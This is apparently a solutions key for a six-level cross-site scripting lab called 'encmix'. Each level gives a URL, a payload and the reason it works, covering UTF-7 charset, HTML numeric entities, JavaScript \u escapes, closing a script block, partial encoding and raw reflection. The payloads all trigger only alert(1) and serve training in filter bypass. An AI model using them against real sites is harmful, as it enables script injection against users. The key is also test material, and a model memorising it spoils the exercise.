# encmix — solutions

Charset and encoding tricks (UTF-7, partial entity encode, JS string escape, JSON-as-HTML, ISO-8859-1).

### encmix-level1

`/encmix/level1/?query=%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-`

- payload: `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
- context: Content-Type charset=utf-7; UTF-7 encoded `<script>` decoded by browser

### encmix-level2

`/encmix/level2/?query=%26%23x3c%3Bscript%26%23x3e%3Balert(1)%26%23x3c%3B/script%26%23x3e%3B`

- payload: `&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;`
- context: server encodes `<`/`>` but not `&`; numeric entities pass through then browser decodes

### encmix-level3

`/encmix/level3/?query=%5Cu003cimg%20src=x%20onerror=alert(1)%5Cu003e`

- payload: `<img src=x onerror=alert(1)>`
- context: inside JS single-quoted string then innerHTML; `\u` escapes survive gsub and JS decodes

### encmix-level4

`/encmix/level4/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: inside `<script>var config={"search":"..."}</script>`; `</script>` closes the block

### encmix-level5

`/encmix/level5/?query=%3Cx%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<x><img src=x onerror=alert(1)>`
- context: server encodes only first `<` and first `>`; second pair raw

### encmix-level6

`/encmix/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: ISO-8859-1 charset; raw reflection — direct injection
